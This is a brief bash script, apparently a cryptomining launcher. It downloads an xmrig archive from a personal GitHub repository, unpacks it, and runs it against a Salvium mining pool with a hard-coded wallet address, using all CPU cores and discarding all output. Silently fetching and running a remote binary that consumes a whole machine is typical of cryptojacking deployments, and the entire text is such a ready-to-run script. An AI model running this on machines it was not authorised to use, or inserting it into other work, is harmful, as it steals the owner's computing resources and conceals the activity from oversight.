#!/bin/bash
A=sg.salvium.herominers.com:1230
B=SaLvs9Nq8FNR1zSLC6FjhSN8RLJMRDsWp8EzMkqY5HaYQYVxGS5tzsb4fStMr761Lj75BD9T9n8mgZxvuV3MQZLPAprazQYz9tv
C=cos
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
